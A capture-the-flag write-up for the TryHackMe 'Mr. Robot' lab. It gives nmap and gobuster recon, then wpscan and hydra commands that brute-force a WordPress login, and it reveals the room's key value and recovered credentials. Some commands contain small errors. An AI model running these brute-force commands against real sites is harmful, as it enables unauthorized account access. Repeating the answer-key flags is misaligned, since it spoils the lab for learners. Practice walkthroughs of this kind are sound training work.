---
description: https://tryhackme.com/room/mrrobot
---

# Mr. Robot

## INIT

```
export mrrobot=10.10.177.95
ping $mrrobot

echo "10.10.177.95 mrrobot.thm" >> /etc/hosts
```

## NMAP

```
nmap -v -sC -sV -O -T5 -p1-65535 mrrobot.thm
```

![](<../.gitbook/assets/image (448).png>)

## GOBUSTER

```
gobuster dir -u mrrobot.thm -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt
```

![](<../.gitbook/assets/image (457).png>)

## HTTP

![](<../.gitbook/assets/image (447).png>)

* [http://mrrobot.thm/prepare](http://mrrobot.thm/prepare)
* [http://mrrobot.thm/fsociety](http://mrrobot.thm/fsociety)
* [http://mrrobot.thm/inform](http://mrrobot.thm/inform)
* [http://mrrobot.thm/question](http://mrrobot.thm/question)
* [http://mrrobot.thm/wakeup](http://mrrobot.thm/wakeup)
* [http://mrrobot.thm/join](http://mrrobot.thm/join)

![](<../.gitbook/assets/image (458).png>)

Wordpress

![](<../.gitbook/assets/image (450).png>)

![](<../.gitbook/assets/image (453).png>)

### What is key 1?

```
curl http://mrrobot.thm/key-1-of-3.txt
```

![](<../.gitbook/assets/image (454).png>)

{% hint style="success" %}
073403c8a58a1f80d943455fb30724b9
{% endhint %}

### What is key 2?

```
curl http://mrrobot.thm/fsocity.dic --output fsocity.dic
```

![](<../.gitbook/assets/image (455).png>)

```
wpscan --url http://mrrobot.thm --paswords fsocity.dic --usernames 'elliot'
```

![](<../.gitbook/assets/image (456).png>)

![](<../.gitbook/assets/image (459).png>)

```
hydra -L fsocity.dic  -p test mrrobot.thm http-post-form "/wp-login/:log=^USER^&pwd=^PASS^wp-submit=Log+In:F=Invalid username"
```

{% hint style="success" %}
Username: Elliot

Password: ER28-0652
{% endhint %}
